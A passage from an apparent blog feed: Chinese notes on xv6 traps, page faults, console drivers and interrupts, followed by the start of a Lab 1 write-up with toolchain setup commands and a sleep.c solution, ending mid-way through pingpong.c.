class="headerlink" title="代码：系统调用参数"></a>代码：系统调用参数</h3><p>根据 RISC-V C 调用约定，系统调用参数存放在寄存器中</p><p>内核陷阱代码将寄存器的值保存到当前进程的 trapframe 中，这样内核可以找到它们</p><p>内核函数 <code>argint</code>，<code>argaddr</code>，<code>argfd</code> 从 trapframe 中检索系统调用参数作为整数、指针或文件描述符，它们都调用 <code>argraw</code>  从用户寄存器中检索</p><p>指针作为参数有两个挑战</p><ul><li>用户程序可能是错误或恶意的，传递一个无效的指针或欺骗内核用来访问内核内存的指针</li><li>xv6 内核页表映射与用户页表映射并不相同，不能用普通指令从提供的地址加载或存储数据</li></ul><p>内核实现了安全的传输数据的函数</p><ul><li>文件系统调用如 exec 用 <code>fetchstr</code>（kernel/syscall.c）从用户空间检索字符串文件名参数</li><li><code>fetchstr</code> 调用 <code>copyinstr</code>（kernel/vm.c）来完成</li><li><code>copyinstr</code>  从用户页表的虚拟地址 p-&gt;pagetable-&gt;srcva 复制 max 字节到 dst 中<ul><li>因为 pagetable 不是当前的页表，<code>copyinstr</code> 使用 walkaddr（它会调用 walk） 在 pagetable 中查找 srcva，从而产生物理地址 pa0</li><li>内核将每个物理内存地址映射到对应的内核虚拟地址，因此 <code>copyinstr</code> 能直接从 pa0 复制字符串字节到 dst</li><li><code>walkaddr</code>（kernel/vm.c）会检查用户提供的虚拟地址是否是进程地址空间的一部分，因此程序不能欺骗内核来读取其他内存</li></ul></li><li>类似的功能 copyout 从内核读取数据到用户提供的地址</li></ul><h3 id="内核-trap"><a href="#内核-trap" class="headerlink" title="内核 trap"></a>内核 trap</h3><p>CPU 在执行内核时，stvec 会指向 <code>kernelvec</code>（kernel/kernelvec.S）</p><p>如果发生 trap 会跳转到 <code>kernelvec</code> 来处理 trap</p><p><code>kernelvec</code> 将通用寄存器保存在中断的内核线程的栈中，trap 有可能导致切换线程，这样不会导致混乱</p><p><code>kernelvec</code> 保存完寄存器后调用 <code>kerneltrap</code>（kernel/trap.c）</p><p><code>kerneltrap</code> 会保存控制寄存器并处理两种 trap</p><ul><li>设备中断<ul><li>使用 <code>devintr</code> 检查设备中断</li><li>如果是计时器中断，且进程的内核线程正在运行，<code>kerneltrep</code> 会调用 <code>yield</code> 让其他线程有机会运行</li></ul></li><li>异常<ul><li>内核会调用 panic 然后停止运行</li></ul></li></ul><p>当 <code>kerneltrap</code> 任务完成后，它需要返回到 trap 中断的代码，会恢复保存的控制寄存器，然后返回到 <code>kernelvec</code></p><p><code>kernelvec</code> 恢复保存的通用寄存器，然后执行 sret，返回中断的内核代码</p><p>在内核开始执行时有一段时间 stvec 仍然指向 <code>uservec</code>，这段时间内不允许发生设备中断</p><p>RISC-V 会在发生 trap 时关闭设备中断，让内核有时间设置 stvec 为 <code>kernelvec</code></p><h3 id="页面错误异常"><a href="#页面错误异常" class="headerlink" title="页面错误异常"></a>页面错误异常</h3><p>CPU 会发出页面错误异常，当：</p><ul><li>虚拟地址在页表中没有映射</li><li>PTE 的 PTE_V 标志位为 0</li><li>PTE 的权限位阻止正在尝试的操作</li></ul><p>RISC-V 区分三种页面错误：</p><ul><li>load page faults</li><li>store page faults</li><li>instruction page faults<ul><li>PC 寄存器的地址指向的指令无法翻译</li></ul></li></ul><p>xv6 的异常处理很单一：如果在用户空间发生异常，内核会杀死出错的进程，如果在内核中发生异常，内核会发生 panic</p><p>真实的操作系统会做很多有趣的处理</p><ul><li>COW fork</li><li>Lazy allocation</li><li>Demand Paging</li><li>Paging to disk</li><li>Extending stacks</li><li>Memory-mapped files</li></ul><h4 id="COW-fork"><a href="#COW-fork" class="headerlink" title="COW fork"></a>COW fork</h4><p>许多内核使用页面错误来实现 COW，加快 fork，它不需要复制内存，特别是在 fork 后 exec 时很高效</p><p>在 xv6 中，<code>fork</code> 会让子进程的初始内存与父进程的相同，它调用 <code>uvmcopy</code> 给子进程分配物理空间并复制父进程的内存给它</p><p>如果父子进程共享父进程的物理内存会更加高效</p><ul><li>COW fork 的简单计划<ol><li>父子进程一开始共享所有的物理页，且设为只读</li><li>当某个进程要写入内存时，CPU 抛出页面错误异常</li><li>内核的 trap 处理程序分配一个新的物理页面，并将原页面的内容复制过去</li><li>将出错进程的页表中相关 PTE 指向副本，允许读写，然后重新执行指令</li></ol></li></ul><p>COW 需要一个记录，来决定物理页面何时释放，它可能有多个进程在使用；当发生 store 页面错误时，如果该物理页面只有出错进程指向它，不需要再复制，直接使用</p><h4 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h4><p>用户程序调用 <code>sbrk</code> 申请更多内存时，内核先增加它的 size，但不申请物理内存，不创建映射</p><p>当用户程序访问新地址时，会发生页面错误，内核再申请一页物理内存并在页表添加映射</p><ol><li>kalloc</li><li>初始化页面</li><li>页面映射</li><li>更新页表</li><li>重新执行指令</li></ol><p>如果用户程序申请了很大内存，但是不去使用，Lazy allocation 会提高效率</p><p>lazy allocation 可以让空间成本随时间分摊，但是会导致页面错误的额外开销</p><p>内核可以通过分配一批连续页面，对页面错误的 trap 处理程序进行特殊化来减小开销</p><h4 id="Demand-paging"><a href="#Demand-paging" class="headerlink" title="Demand paging"></a>Demand paging</h4><p>在 <code>exec</code> 中，xv6 会将程序的所有 text 和 data 直接加载到内存中，由于程序可能会很大，从磁盘中读取开销昂贵</p><ol><li>现代内核为用户地址空间创建页表，但是 PTE 标记为无效</li><li>当出现页面错误时，内核将页面的内容从磁盘中读取，添加映射</li></ol><h4 id="Paging-to-disk"><a href="#Paging-to-disk" class="headerlink" title="Paging to disk"></a>Paging to disk</h4><p>一个进程可能需要的内存多于计算机的 RAM，操作系统可能会实现 paging to disk</p><p>内核会将用户页面的一部分放在内存中，其余的页面保存到磁盘中的 paging area 区域，并将对应的 PTE 标记为无效</p><p>当进程尝试访问磁盘上的页面，会发生页面错误，内核会将该页面从硬盘中读取出来</p><p><strong>如果没有多余的内存</strong></p><p>内核先将一个页面驱逐，保存到磁盘中，将对应的 PTE 标记为无效，但是驱逐的花销是昂贵的</p><h3 id="真实世界-2"><a href="#真实世界-2" class="headerlink" title="真实世界"></a>真实世界</h3><p>如果将内核内存映射到每个进程的用户页表中，可以消除对页表切换的需求</p><p>生产环境的操作系统实现了 COW、Lazy allocation、Demand paging、Paging to disk、Memory-mapped files 等等</p><p>xv6 没有这样做，如果用完内存，</p><h2 id="Chapter-5-Interrupts-and-device-drivers"><a href="#Chapter-5-Interrupts-and-device-drivers" class="headerlink" title="Chapter 5 Interrupts and device drivers"></a>Chapter 5 Interrupts and device drivers</h2><ul><li><p>驱动程序（driver）</p><ul><li>操作系统中管理特定设备的代码它配置硬件，告诉设备执行操作，处理产生的中断，与可能正在等待来自设备 I/O 的进程进行交互</li><li>driver 代码可能很复杂，因为驱动程序与它管理的设备要同时执行</li><li>driver 必须了解设备的硬件接口，接口可能很复杂且缺乏文档记录</li><li>后续驱动程序用 driver 表示<del>（别问，问就是 driver 在一堆中文里更清晰）</del></li></ul></li><li><p>中断（Interrupt）</p><ul><li>设备需要操作系统特别关注，它可以进行配置，产生中断（trap 的一种）</li><li>当设备发起中断，内核 trap 处理代码能识别出设备中断并调用驱动程序的中断处理程序</li><li>在 xv6 中，中断处理的分配在 <code>devintr</code> 函数中</li></ul></li><li><p>许多设备 driver 在两个上下文中执行代码</p><ul><li>在进程的内核线程中执行前半部分<ul><li>前半部分由需要执行 I/O 的系统调用（如 <code>read</code> 和 <code>write</code>）来调用</li><li>此代码可能请求硬件启动操作（如请求硬盘读取块），然后等待操作完成</li><li>最后设备完成操作，发起中断</li></ul></li><li>在中断时执行后半部分<ul><li>driver 的中断处理程序作为后半部分</li><li>它找到设备完成的操作，在适当的情况唤醒正在等待的进程</li><li>告诉硬件开始处理下一个操作</li></ul></li></ul></li></ul><h3 id="代码：控制台输入"><a href="#代码：控制台输入" class="headerlink" title="代码：控制台输入"></a>代码：控制台输入</h3><h4 id="控制台连接到-RISC-V"><a href="#控制台连接到-RISC-V" class="headerlink" title="控制台连接到 RISC-V"></a>控制台连接到 RISC-V</h4><p>控制台 driver 位于 kernel/console.c，可作为驱动程序结构的一个简单说明</p><p>xv6 的控制台 driver 交互的 UART 硬件是 QEMU 仿真的 16550 芯片，在真实的计算机，一个 16550 芯片管理 RS232 串行链路，连接着一个中断或其他计算机。当运行 QEMU 时，它连接着键盘和显示器</p><p>控制台 driver 一次累积一行的输入，处理特殊的输入字符，如退格 backspace 和 control-u</p><p>当用户在 QEMU 中向 xv6 输入时，击键通过 QEMU 模拟的 UART 硬件传递给 xv6</p><ul><li>一些物理地址由 RISC-V 硬件连接到 UART 设备<ul><li>从这些物理地址读写是与设备硬件交互而不是内存</li><li>UART 的内存映射地址从 0x10000000 （或 <code>UART0</code> kenrel/memlayout.h）开始</li></ul></li></ul><h4 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h4><p>UART 硬件在软件层面为一组内存映射的控制寄存器（这里的寄存器并不是 CPU 寄存器，而且位于 UART 硬件中的寄存器）</p><ul><li>UART 控制寄存器宽度为 1 Byte，它们在 <code>UART0</code> 的偏移在 kernel/uart.c 中定义</li><li>LSR <ul><li>line status register</li><li>比特位表示输入的字符是否在等待软件读取</li></ul></li><li>RHR<ul><li>receive holding register</li><li>保存等待读取的字符</li><li>每次一个字符被读取，UART 硬件将它从一个 FIFO 的结构中删除</li><li>当 FIFO 结构为空时将 LSR 的 ready 位清零</li></ul></li><li>THR<ul><li>transimit holding register</li><li>保存等待传输的字符</li></ul></li></ul><p>UART 传输硬件很大程度上独立于接收硬件，如果软件向 THR 写 1 Byte，UART 就传输该字节</p><h4 id="xv6-的控制台输入"><a href="#xv6-的控制台输入" class="headerlink" title="xv6 的控制台输入"></a>xv6 的控制台输入</h4><p>xv6 的 <code>main</code> 调用 <code>consoleinit</code> 来初始化 UART 硬件，配置 UART 让它每接收到 1 Byte 输入就生成一个 receive 中断，每完成 1 Byte 的输出就生成一个 transmit complete 中断</p><ul><li>用户进程，如 shell，通过 user/init.c 打开的文件描述符，使用 <code>read</code> 系统调用从控制台获取输入行</li><li><code>read</code> 系统调用通过内核的 <code>consoleread</code> 完成操作</li><li><code>consoleread</code> 等待输入（通过中断），然后将字符放入 cons.buf 作为缓冲，把输入复制到用户空间，直到一整行输入到达，返回到用户进程<ul><li>如果用户还没有输入一整行，任何需要读取的进程都在 <code>sleep</code> 调用中等待</li></ul></li></ul><p>当用户输入一个字符</p><ul><li>UART 硬件请求 RISC-V 发起中断，激活 xv6 的 trap 处理程序</li><li>trap 处理程序会调用 <code>devintr</code>，从 scause 寄存器查找中断来自哪个外部设备，然后告诉 PLIC 硬件单元哪个设备发出中断，如果来自 UART，<code>devintr</code> 会调用 <code>uartintr</code></li><li><code>uartintr</code> 读取来自 UART 硬件的等待输入的字符（RHR），将它们传给 <code>consoleintr</code></li><li><code>consoleintr</code> 会将字符积累在 cons.buf，但对 backspace 和一些其他字符特殊处理</li><li>当一行新的字符到达（读取到 ‘\n’）时，<code>consoleintr</code> 会唤醒一个正在等着等待的 <code>consoleread</code></li></ul><h3 id="代码：控制台输出"><a href="#代码：控制台输出" class="headerlink" title="代码：控制台输出"></a>代码：控制台输出</h3><p>设备 driver 维护一个输入缓冲区 uart_tx_buf，因此需要输出的进程不需要等待 UART 完成发送，除非缓冲区已满</p><ul><li><code>write</code> 系统调用使用连接着控制台的文件描述符，最终会到达 <code>uartputc</code></li><li><code>uartputc</code> 将每个字符加入缓冲区，调用 <code>uartstart</code> 开始设备传输并返回</li></ul><p>UART 每完成一个字节的发送，就会发起中断，<code>uartintr</code> 调用 <code>uartstart</code> 检查设备是否已经完成发送，然后将下一个缓冲的输出字符传给设备</p><p>如果一个进程将多个字节写入控制台，第一个字节会由 <code>uartputc</code> 调用的 <code>uartstart</code> 来发送，剩下的字节由 <code>uartintr</code> 调用的 <code>uartstart</code> 来发送</p><p>需要注意的是，这里通过缓冲和中断将设备活动和进程活动进行解耦</p><p>控制台 driver 可以处理输入，即使没有进程等待读取，一个后来的读取可以看到输入；进程可以不等待设备发送输出</p><p>解耦通过允许进程与设备 I/O 同时执行来提高性能，当设备速度慢（如 UART）或需要即时响应（如回应键入的字符）时尤其重要</p><p>这也被称为 I/O 并行</p><h3 id="驱动程序中的并发"><a href="#驱动程序中的并发" class="headerlink" title="驱动程序中的并发"></a>驱动程序中的并发</h3><p>你可能注意到在 <code>consoleread</code> 和 <code>consoleintr</code> 中调用 <code>acquire</code></p><p>这个调用申请一个🔒，保护控制台 driver 的数据结构免受并发访问影响</p><p>三个并发危险，可能会导致竞争或死锁</p><ul><li>两个在不同 CPU 核的进程同时调用 <code>consoleread</code></li><li>当 CPU 正在执行 <code>consoleread</code> 时，硬件可能请求该 CPU 发送控制台中断</li><li>当 CPU 正在执行 <code>consoleread</code> 时，硬件可能在另一个 CPU 中发送控制台中断</li></ul><p>drivers 的并发另一个需要小心的地方：一个进程可能等待设备输入，当另一个进程在运行时，输入的中断信号可能到达</p><p>中断处理程序不会考虑中断的进程和代码，例如一个中断处理程序无法安全地使用当前进程的页表调用 <code>copyout</code>，它只会做很少量的工作（如，将输入数据复制到缓冲区），并唤醒前半部分代码完成其余工作</p><h3 id="定时器中断"><a href="#定时器中断" class="headerlink" title="定时器中断"></a>定时器中断</h3><p>Xv6 使用定时器中断维持时钟，使其能在进程之间切换进行调度</p><p><code>usertrap</code> 和 <code>kerneltrap</code> 中的 <code>yield</code> 调用也会导致这类切换</p><p>定时器中断来自 RISC-V 中每个 CPU 的时钟硬件，xv6 对这个时钟硬件编程，以定期中断每个 CPU</p><p>RISC-V 要求计时器中断要由机器模式接管，而不是管理者模式</p><p>RISC-V 机器模式不用分页执行代码，使用一组独立的控制寄存器，因此在机器模式执行普通的 xv6 内核代码时是不实际的</p><p>因此 xv6 将定时器中断独立于之前使用的 trap 机制进行处理</p><p>机器模式执行的代码在 kernel/start.c 中，在执行 <code>main</code> 之前，设置定时器中断的接收</p><ul><li>对 CLINT（core-local interruptor）硬件进行编程，以在一定延迟后生成中断</li><li>设立一个类似 trapframe 的临时区域，帮助定时器中断处理程序保存寄存器和 CLINT 寄存器的地址</li><li>最后 <code>start</code> 将 mtvec 设置为 <code>timervec</code>（在 kernel/kernelvec.S 中），启用定时器中断</li></ul><h3 id="真实世界-3"><a href="#真实世界-3" class="headerlink" title="真实世界"></a>真实世界</h3><p>xv6 允许在执行内核和用户程序时启用设备和定时器中断</p><p>定时器中断强制线程切换，即使是在内核态运行，因此内核代码需要注意它可能被挂起，并在不同的 CPU 上恢复</p><p>如果内核线程有时花费大量时间计算而不返回用户空间，在内核线程之间公平地对 CPU 进行时间切片是有效的</p><p>如果只在执行用户代码时发生设备和定时器中断，会让内核更简单</p><p>在一台计算机上支持所有设备是一项艰巨的工作，因为有许多设备，有许多功能，设备和 driver 之间的协议可能很复杂且缺乏文档。在许多操作系统中，driver 比内核核心代码占用更多</p><p>UART driver 通过读取 UART 控制寄存器一次检索 1 Byte 的数据，称为 programmed I/O，因为软件正在驱动数据移动</p><h4 id="DMA"><a href="#DMA" class="headerlink" title="DMA"></a>DMA</h4><ul><li>编程 I/O 很简单，但是速度太慢，无法在高数据速率下使用</li><li>xv6 的 UART driver 先将传入的数据复制到内核的缓冲区，再复制到用户空间，在低数据速率时有效，但如果设备产生或使用数据很快，两次复制会严重降低性能</li></ul><p>因此有直接存储器访问（DMA）技术</p><ul><li>DMA 硬件设备直接将传入的数据写入 RAM，并从 RAM 读取传出的数据</li><li>高速移动大量数据的设备（现代磁盘和网络设备）通常使用直接存储器访问（DMA）</li></ul><p>一些操作系统常使用 DMA 直接将数据在用户空间的缓冲区和设备硬件之间移动</p><p>DMA 设备 driver 在 RAM 中准备数据，对一个控制寄存器进行一次写入告诉设备去处理准备好的数据</p><h4 id="中断优化"><a href="#中断优化" class="headerlink" title="中断优化"></a>中断优化</h4><p>当一个设备在不可预测的时间需要关注时，中断是有意义的，但是中断有很高的 CPU 开销</p><p>高速设备（如网络和磁盘控制器）使用一些技巧减少中断的需求</p><ul><li>对整批传入或传出的请求发起一个中断</li><li>轮询：完全禁用中断，定期检查设备是否需要关注</li></ul><p>如果设备执行操作非常快，轮询效率较高，但是如果设备大部分时间处于空闲状态，则会浪费 CPU 时间</p><p>某些驱动程序根据当前设备负载会在轮询和中断之间动态切换</p><h4 id="设备使用"><a href="#设备使用" class="headerlink" title="设备使用"></a>设备使用</h4><p>如第 1 章所述，控制台在应用程序呈现为一个常规文件，应用程序通过 <code>read</code> 和 <code>write</code> 系统调用读取输入，写入输出</p><p>应用程序可能想要控制不能作为标准文件系统调用的设备，Unix 操作系统支持 ioctl 系统调用应对这种情况</p><h4 id="实时响应"><a href="#实时响应" class="headerlink" title="实时响应"></a>实时响应</h4><p>计算机的一些使用需要系统在有限的时间内做出响应（严格安全的系统错过 deadline 可能会导致灾难）</p><p>xv6 不适合严格实时设置，严格实时操作系统往往是与应用程序链接的库，允许进行分析最坏情况下的响应时间</p><p>xv6 也不适合软实时应用程序，偶尔错过 deadline 是可以接受的，因为 xv6 调用程序过于简单，并且它在内核代码路径中有一段较长时间中断是禁止的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文是笔者在学习 MIT 6.1810 2022 Fall 阅读 xv6 文档时所写，大部分是将原文翻译，笔者尽可能加入自己的理解并排版，&lt;del&gt;应该会&lt;/del&gt;持续更新直到文档读完&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab1 Xv6 and Unix utilities</title>
    <link href="https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/"/>
    <id>https://humoooor.cn/2022/10/13/Lab1_Xv6_and_Unix_utilities/</id>
    <published>2022-10-13T11:47:00.000Z</published>
    <updated>2024-01-04T04:29:59.514Z</updated>
    
    <content type="html"><![CDATA[<p>开学！</p><span id="more"></span><h2 id="启动-xv6"><a href="#启动-xv6" class="headerlink" title="启动 xv6"></a>启动 xv6</h2><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://g.csail.mit.edu/xv6-labs-2022</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 git 日志</span></span><br><span class="line">git status</span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于获取实验所需文件</span></span><br><span class="line">git checkout util</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当完成一个实验并想要检记录进度可使用 git commit</span></span><br><span class="line">git commit -am <span class="string">&#x27;my solution for util lab exercise 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看相比上一次 commit 的变化</span></span><br><span class="line"><span class="string">git diff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 查看相比最初的变化</span></span><br><span class="line"><span class="string">git diff origin/util</span></span><br></pre></td></tr></table></figure><h3 id="建立并运行-xv6"><a href="#建立并运行-xv6" class="headerlink" title="建立并运行 xv6"></a>建立并运行 xv6</h3><ul><li><p><code>make qemu</code></p><ul><li><p>第一步就出错了。。。</p><ul><li><code>Error: Couldn&#39;t find a riscv64 version of GCC/binutils.</code></li><li>缺少 RISC-V 相关的 GCC/binutils</li><li>搜索 binutils <code>apt search binutils | grep riscv64</code></li><li>安装第一个即可</li><li><code>sudo apt install binutils-riscv64-linux-gnu</code></li></ul></li><li><p>接着是另一个报错</p><ul><li><code>riscv64-linux-gnu-gcc    -c -o kernel/entry.o kernel/entry.S</code></li><li><code>make: riscv64-linux-gnu-gcc: No such file or directory</code></li><li><code>make: *** [\&lt;builtin\&gt;: kernel/entry.o] Error 127</code></li><li>安装对应的 gcc <code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li>进入 /usr/bin 目录，建立软链接</li><li><code>sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li></ul></li><li><p>后面又是缺少什么文件，去翻了翻 lab 介绍，发现已经给了工具链接 <a href="https://pdos.csail.mit.edu/6.828/2022/tools.html">lab tools page</a></p><ul><li><code>sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu</code></li><li>这里的 gcc-riscv64-linux-gnu 下载的是 gcc-11，要再下回 gcc-10，不然会报错</li><li><code>sudo apt install gcc-10-riscv64-linux-gnu</code></li><li><code>cd /usr/bin; sudo ln -s riscv64-linux-gnu-gcc-10 riscv64-linux-gnu-gcc</code></li><li>结果一气呵成~</li></ul></li></ul></li></ul><p>里面有一些很基本的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xv6 kernel is booting</span><br><span class="line"></span><br><span class="line">hart 1 starting</span><br><span class="line">hart 2 starting</span><br><span class="line">init: starting sh</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">.              1 1 1024</span><br><span class="line">..             1 1 1024</span><br><span class="line">README         2 2 2227</span><br><span class="line">xargstest.sh   2 3 93</span><br><span class="line"><span class="built_in">cat</span>            2 4 32832</span><br><span class="line"><span class="built_in">echo</span>           2 5 31728</span><br><span class="line">forktest       2 6 15680</span><br><span class="line">grep           2 7 36176</span><br><span class="line">init           2 8 32152</span><br><span class="line"><span class="built_in">kill</span>           2 9 31712</span><br><span class="line"><span class="built_in">ln</span>             2 10 31520</span><br><span class="line"><span class="built_in">ls</span>             2 11 34728</span><br><span class="line"><span class="built_in">mkdir</span>          2 12 31784</span><br><span class="line"><span class="built_in">rm</span>             2 13 31768</span><br><span class="line">sh             2 14 53960</span><br><span class="line">stressfs       2 15 32496</span><br><span class="line">usertests      2 16 181776</span><br><span class="line">grind          2 17 47696</span><br><span class="line"><span class="built_in">wc</span>             2 18 33832</span><br><span class="line">zombie         2 19 31168</span><br><span class="line">console        3 20 0</span><br></pre></td></tr></table></figure><p>-<del>甚至都没有 clear</del></p><p>Ctrl-p 打印进程信息</p><p>Ctrl-a x 退出 qemu</p><p><strong>结论：做任何事之前先看介绍</strong></p><h3 id="成绩测试"><a href="#成绩测试" class="headerlink" title="成绩测试"></a>成绩测试</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试所有实验</span></span><br><span class="line">make grade</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试一个程序</span></span><br><span class="line">./grade-lab-util name</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">make GRADEFLAGS=name grade</span><br></pre></td></tr></table></figure><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>在 bash 中测试，能够多参数且如果一个参数错误就不执行</p><figure class="highlight c"><figcaption><span>user/sleep.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">isDigitStr</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(str); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(str[i] &lt; <span class="string">&#x27;0&#x27;</span> || str[i] &gt; <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;sleep: missing operand\n&quot;</span>);</span><br><span class="line">        status = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!isDigitStr(argv[i])) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sleep: invalid time interval\n&quot;</span>);</span><br><span class="line">            status = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc &amp;&amp; !status; i++) &#123;</span><br><span class="line">        sleep(atoi(argv[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源代码放在 <code>user</code> 目录下，每次写完一个程序在 Makefile 中的 UPROGS 下添加一行 <code>$U/_sleep\</code></p><p>然后 <code>make qemu</code> 编译运行</p><p>之后可以在 qemu 外运行 <code>/grade-lab-util sleep</code> 进行单项测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./grade-lab-util <span class="built_in">sleep</span></span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to <span class="built_in">date</span>.</span><br><span class="line">== Test <span class="built_in">sleep</span>, no arguments == <span class="built_in">sleep</span>, no arguments: OK (1.5s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, returns == <span class="built_in">sleep</span>, returns: OK (0.6s)</span><br><span class="line">== Test <span class="built_in">sleep</span>, makes syscall == <span class="built_in">sleep</span>, makes syscall: OK (1.0s)</span><br></pre></td></tr></table></figure><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><p>简单题</p><p>父进程发送子进程一个字节，子进程收到后再给父进程一个字节</p><figure class="highlight c"><figcaption><span>user/pingpong.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid, 